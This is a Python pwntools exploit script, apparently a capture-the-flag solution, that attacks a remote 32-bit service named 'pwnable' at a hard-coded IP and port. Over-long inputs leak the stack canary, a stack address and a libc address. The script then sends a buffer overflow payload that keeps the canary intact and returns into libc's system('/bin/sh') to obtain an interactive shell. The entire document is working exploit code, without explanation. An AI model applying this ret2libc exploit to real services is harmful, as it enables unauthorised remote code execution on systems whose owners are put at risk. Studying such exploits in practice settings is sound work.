from pwn import *

context.log_level = 'debug'
r = remote('13.233.66.116', 7000)

rr = lambda x: r.recvuntil(str(x))
ss = lambda x: r.sendline(str(x))

binary = ELF('./pwnable')
libc = ELF('/lib/i386-linux-gnu/libc-2.23.so')
libc_main_offset = libc.symbols['__libc_start_main']
libc_system_offset = libc.symbols['system']
libc_binsh_offset = next(libc.search('/bin/sh\x00'))

# leak canary
p = 'a' * (0x20+1)
ss(p)
canary = u32('\x00' + rr('\n')[33:36])

# leak stack address
p = 'a' * (0x2c)
ss(p)
stack = u32(rr('\n')[0x2c:0x30])

# leak libc base
p = 'a' * (0x50)
ss(p)
libc_main = u32(rr('\n')[len(p):len(p)+4])
libc_base = libc_main - (libc_main_offset + 247)
libc_system = libc_base + libc_system_offset
libc_binsh = libc_base + libc_binsh_offset

# exploit
p = 'break'
p += 'a' * (0x20-5)
p += p32(canary)
p += 'a' * 0x8
p += p32(stack)
p += 'a' * (80-len(p))
p += p32(libc_system)
p += 'a' * 4
p += p32(libc_binsh)
ss(p)
r.interactive()
